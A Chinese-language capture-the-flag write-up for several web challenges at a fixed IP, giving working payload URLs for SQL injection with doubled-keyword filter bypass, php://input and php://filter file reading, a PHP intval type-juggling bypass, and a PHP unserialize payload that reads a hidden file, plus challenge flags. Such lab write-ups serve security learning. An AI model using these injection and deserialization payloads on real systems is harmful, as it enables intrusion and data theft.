## web1http://123.206.31.85:10001/

变量覆盖,提交a,c两个变量为空就行了,http://123.206.31.85:10001/?a=&c=  得到flag

## 流量分析.rar
直接追踪telnet的tcp流即可

## web11 http://123.206.31.85:3030/
进去页面为空,访问robots.txt就可以知道题目在shell.php.  
substr(md5(XXXX), 0, 6) = xxxx的形式,用脚本爆破md5即可,参考百度别人写的脚本.

## web13 http://123.206.31.85:10013
响应头里面有一项:  
Password:ZmxhZ3szYzAwZGFhN2VkMTIwM2MyODQ4MGY0OGZmZjc5M2E4Nn0=
base64解密即可

## Sql injection web18 http://123.206.31.85:10018
sql关键字要进行双写绕过过滤  
>查字段数 http://123.206.31.85:10018/list.php?id=1%27%20oorrder%20by%204--+   

>回显位置 http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,2,3--+  

>查表名
http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,group_concat(table_name),3%20from%20infoorrmation_schema.tables%20where%20table_schema=database()--+
返回有 ctf,flag两个表 

>查flag表中的字段  http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,group_concat(column_name),3%20from%20infoorrmation_schema.columns%20where%20table_name=%27flag%27--+%20id,flag%203  

>查flag字段的值 http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,flag,3%20from%20flag--+ 可直接得到flag


## web20 http://123.206.31.85:10020/


## vim编辑器 [web15](  http://123.206.31.85:10015/)
根据提示,感觉是vim文件泄露,尝试index.php~和index.php.wsp,最后index.php~可以得到源码  
```php
<?php
header('content-type:text/html;charset=utf-8');
include './flag.php';
error_reporting(0);
if(empty($_GET['id'])){
    header('location:./1ndex.php');
}else{
	$id = $_GET['id'];
	if (!is_numeric($id)) {
		$id = intval($id);
		switch ($id) {
			case $id>=0:
				echo "快出去吧，走错路了～～～<br>";
				echo "这么简单都不会么？";
				break;
			case $id>=10:
				exit($flag);
				break;
			default:
				echo "你走不到这一步的!";
				break;
		}
	}
}
?>
```
审计源码,要求提交的id不能为数字,关键在intval函数,我是提交字符串100a,则id=100,输出flag
http://123.206.31.85:10015/index.php?id=%22110a%22


## [web21]( http://123.206.31.85:10021/)
F12查看提示的源码
```php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```
file_get_contents函数要求user为文件,于是用php://input伪协议,尝试读取class.php  
http://123.206.31.85:10021/?user=php://input&file=php://filter/convert.base64-encode/resource=class.php  
同时post传入 admin

得到base64加密的密文,解密得到class.php 
```php
<?php
error_reporting(E_ALL & ~E_NOTICE);
 
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```
同理,再读取index.php
```php
<?php
error_reporting(E_ALL & ~E_NOTICE);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}
 
?>
 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 --
```
这就可以清楚地发现是要用反序列化了,因为f1a9被过滤不能存在file变量中.读取f1a9.php关键是file_get_contents函数.   
直接new 一个class对象反序列化出来是:  
O:4:"Read":1:{s:4:"file";N;}  
>直接构造pyload,使得$this->file为f1a9.php:  
O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}  

>最终  
http://123.206.31.85:10021/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}  
同时post提交admin  
flag在注释中,抓包提交的话可以直接看到


### 本身比较菜,最近又比较忙,没有跟上师傅们的节奏...
### 未完待续...